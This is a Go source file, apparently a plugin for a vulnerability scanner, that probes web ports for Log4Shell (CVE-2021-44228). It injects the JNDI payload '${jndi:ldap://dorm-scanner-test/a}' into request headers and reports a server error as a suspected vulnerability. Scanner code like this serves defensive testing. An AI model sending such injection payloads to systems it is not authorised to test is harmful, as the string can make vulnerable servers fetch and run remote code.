package plugins

import (
	"DORM/models"
	"net/http"
)

// 51. LOG4SHELL (JNDI Injection - Header)
type Log4jPlugin struct{}

func (p *Log4jPlugin) Name() string { return "Log4Shell (CVE-2021-44228)" }

func (p *Log4jPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
	payload := "${jndi:ldap://dorm-scanner-test/a}"
	req.Header.Set("User-Agent", payload)
	req.Header.Set("X-Api-Version", payload)

	resp, err := models.GetClient().Do(req)
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 500 {
			return &models.Vulnerability{
				Target: target, Name: "Log4Shell Suspected", Severity: "CRITICAL", CVSS: 10.0,
				Description: "Log4j payload caused server error.",
				Solution:    "Update Log4j library immediately.",
				Reference:   "CVE-2021-44228",
			}
		}
	}
	return nil
}
